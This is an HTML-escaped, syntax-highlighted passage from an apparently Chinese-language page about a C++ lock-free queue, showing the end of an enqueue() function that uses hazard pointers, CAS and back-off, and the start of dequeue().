&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-20&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guard&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;protect&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;node_to_value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_model&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_acquire&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-25&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            有趣的是：该算法假定&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-26&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            m_pTail不能指向尾部（Tail），&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-27&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            而是希望通过进一步的调用实现对Tail正确的设置。&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-28&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            多线程互助就是一个典型的例子&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-29&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// 在接下来的线程之后&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// 有必要有效地清理Tail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;compare_exchange_weak&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                       &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-36&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  全部必须从新开始，即使CAS不成功；&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-37&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  CAS不成功的，意味着在我们读取m_pTail之前，它已经被改变&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-38&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;                  */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;compare_exchange_strong&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_release&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-44&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;relaxed&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Have successfully added a new element to the queue.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-50&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          执行失败- 即CAS运算没有成功&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-51&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          这意味着有人先我们到达&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-52&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          检测到有并发，为了不恶化CAS&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-53&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          调用back_off函数&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-54&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          我们及时地做一个短时间的回退&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-55&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;bkoff&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-58&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-59&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;       通常，我们可以利用元素计数器&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-60&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      显而易见，此计数器是不很准确：&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-61&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      元素早已添加，我们现在的才进行计数&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-62&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      这样的计数器只能作为元素数量的清单，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-63&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      不能作为一个空队列符号&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-64&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-65&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;ItemCounter&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-67&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      最后，试着改变m_pTail的Tail。&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-68&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      不用在意成功与否，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-69&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      如果没有成功，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-70&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      它们会在dequeue()方法的Oops!注解前后被清理掉&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-71&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-72&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;compare_exchange_strong&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-73&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_acq_rel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;relaxed&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-74&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-75&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;    本算法返回必然是true。&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-76&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;    其它算法，比如有界队列，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-77&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;    当队列已满时，可以返回false&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-78&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;    为了保证接口的一致性，enqueue()&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-79&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;    总是返回成功的标志&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-80&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;    */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-81&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-82&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-83&quot;&gt;
&lt;span class=&quot;crayon-e &quot;&gt;value_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;dequeue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-84&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-85&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-86&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;back_off &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bkoff&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-87&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// We need 2 Hazard Pointers for dequeue &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-88&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;typename &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;template &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;GuardArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-89&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-90&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Keep trying till we can execute it…&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-91&quot;&gt;
